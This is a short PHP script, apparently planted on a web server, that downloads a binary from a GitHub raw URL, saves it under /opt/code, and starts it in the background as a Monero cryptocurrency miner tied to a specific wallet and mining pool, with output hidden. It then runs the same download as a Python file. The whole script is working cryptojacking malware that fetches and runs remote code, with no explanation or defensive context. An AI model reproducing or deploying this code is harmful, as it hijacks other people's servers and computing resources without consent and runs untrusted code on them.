<?php
system('mkdir /opt/code');
file_put_contents("/opt/code/goal", fopen("https://raw.githubusercontent.com/x7r3mx/arm/master/goal", 'r'));
file_put_contents("/opt/code/origin.py", fopen("https://raw.githubusercontent.com/x7r3mx/arm/master/goal", 'r'));
system('chmod -R 700 /opt/code');
$cmd= "/opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr";
exec($cmd. " > /dev/null &");
$cmd="python /opt/code/origin.py";
exec($cmd. " > /dev/null &");
?> 

